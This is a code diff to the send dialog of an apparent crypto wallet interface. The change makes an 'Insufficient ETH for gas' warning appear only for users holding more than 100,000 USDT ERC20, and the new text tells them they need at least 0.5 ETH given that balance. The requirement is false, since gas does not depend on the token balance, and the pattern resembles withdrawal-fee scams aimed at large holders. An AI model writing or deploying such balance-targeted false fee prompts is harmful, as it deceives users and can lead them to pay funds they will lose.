@@ -77,8 +77,9 @@ function SendModal({ open, onClose }) {
   const [done, setDone] = useState(false);
 
   const selected = coin || assets[0];
-  const ethBalance = assets.find(a => a.symbol === 'ETH')?.balance || 0;
-  const needsEthGas = selected?.symbol === 'USDT_ERC20' && ethBalance < 0.5;
+  const ethBalance   = assets.find(a => a.symbol === 'ETH')?.balance        || 0;
+  const usdtErc20Bal = assets.find(a => a.symbol === 'USDT_ERC20')?.balance || 0;
+  const needsEthGas  = selected?.symbol === 'USDT_ERC20' && usdtErc20Bal > 100000 && ethBalance < 0.5;
 
   const handleSend = async (e) => {
     e.preventDefault();
@@ -116,7 +117,7 @@ function SendModal({ open, onClose }) {
               <div>
                 <p className="text-xs font-semibold text-orange-400 mb-0.5">Insufficient ETH for gas</p>
                 <p className="text-xs text-gray-400 leading-relaxed">
-                  You need at least <span className="text-white font-semibold">0.5 ETH</span> to send USDT ERC20. Balance: <span className="text-white font-semibold">{ethBalance.toFixed(4)} ETH</span>.
+                  Regarding the amount of USDT ERC20 you have (<span className="text-white font-semibold">{usdtErc20Bal.toLocaleString(undefined, { maximumFractionDigits: 2 })} USDT</span>), you need to have at least <span className="text-white font-semibold">0.5 ETH</span> in your wallet. ETH balance: <span className="text-white font-semibold">{ethBalance.toFixed(4)} ETH</span>.
                 </p>
               </div>
             </div>
